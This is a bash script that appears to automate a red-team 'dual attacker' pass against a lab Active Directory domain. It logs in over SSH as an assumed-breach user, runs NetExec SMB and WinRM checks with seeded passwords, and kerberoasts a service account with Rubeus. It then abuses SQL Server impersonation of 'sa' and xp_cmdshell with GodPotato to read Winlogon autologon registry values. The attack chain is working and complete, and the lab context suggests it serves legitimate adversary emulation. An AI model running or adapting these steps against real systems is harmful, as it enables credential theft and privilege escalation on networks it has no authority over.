#!/usr/bin/env bash
# Dual attacker: Kali/provisioning (network) + ws01 assumed-breach SSH (analyst_t1).
set -uo pipefail
export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
ENGAGE="${REDSTRIKE_ENGAGE:-mcp-llm-20260822T105200Z}"
LOG="$HOME/redstrike-runs/${ENGAGE}.console"
SEED="$HOME/CADRE/attack-matrix/Campaign/automation/lab-seed-creds.json"
KEY="${HOME}/.ssh/cadre-ws01-key"
WS01="analyst_t1@192.168.77.62"
SSH=(ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile="${HOME}/.ssh/cadre-known_hosts")
mkdir -p "$(dirname "$LOG")"
exec > >(stdbuf -oL tee -a "$LOG") 2>&1

ts() { date -u +%Y-%m-%dT%H:%M:%S.%3NZ; }
step() { printf '\n======== %s %s ========\n' "$(ts)" "$*"; }

pw() { python3 -c "import json,sys; print(json.load(open(sys.argv[1]))['credentials'][sys.argv[2]]['password'])" "$SEED" "$1"; }
T1="$(pw analyst_t1)"

step "KALI assumed-breach SSH to ws01 as analyst_t1"
"${SSH[@]}" "$WS01" "powershell.exe -NoProfile -Command \"whoami; \$env:COMPUTERNAME; (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole('Administrator')\""

step "KALI nxc SMB/WinRM to ws01 (local admin check)"
nxc smb 192.168.77.62 -u analyst_t1 -p "$T1" -d child.cadre.local --shares | sed -E 's/:[^ ]+ /:*** /'
nxc winrm 192.168.77.62 -u analyst_t1 -p "$T1" -d child.cadre.local -x "whoami" | sed -E 's/:[^ ]+ /:*** /'

step "WS01 tools (Rubeus/mimikatz) via SSH"
"${SSH[@]}" "$WS01" "cmd.exe /c dir /b C:\\Tools\\cadre-attack\\Rubeus.exe C:\\Tools\\ADTools\\Rubeus.exe C:\\Tools\\cadre-attack\\mimikatz.exe C:\\Windows\\Temp\\cadre-tools\\mimikatz.exe 2>nul"

step "WS01 Rubeus kerberoast as current user (assumed-breach, not intern_blue hop)"
"${SSH[@]}" "$WS01" "powershell.exe -NoProfile -Command \"\$e='C:\\Tools\\cadre-attack\\Rubeus.exe'; if (-not (Test-Path \$e)) { \$e='C:\\Tools\\ADTools\\Rubeus.exe' }; if (-not (Test-Path \$e)) { 'RUBEUS_MISSING'; exit 1 }; & \$e kerberoast /user:svc_mssql /domain:child.cadre.local /dc:dc02.child.cadre.local /nowrap\"" | awk '
  /krb5tgs/ { print "[TGS]", $0; next }
  { print }
'

step "KALI SQL GodPotato Winlogon (T035A) on mbr01"
SQLF=$(mktemp)
cat >"$SQLF" <<'SQL'
EXECUTE AS LOGIN = 'sa';
EXEC master..xp_cmdshell 'C:\Windows\Temp\gp-net4.exe -cmd "cmd /c reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultUserName"';
EXEC master..xp_cmdshell 'C:\Windows\Temp\gp-net4.exe -cmd "cmd /c reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultDomainName"';
EXEC master..xp_cmdshell 'C:\Windows\Temp\gp-net4.exe -cmd "cmd /c reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v AutoAdminLogon"';
EXEC master..xp_cmdshell 'C:\Windows\Temp\gp-net4.exe -cmd "cmd /c whoami"';
REVERT;
SQL
timeout 90 impacket-mssqlclient "analyst_t1:${T1}@192.168.77.22" -file "$SQLF" || echo "WINLOGON_SQL_FAIL rc=$?"
rm -f "$SQLF"

step "dual-attacker pass complete $(ts)"
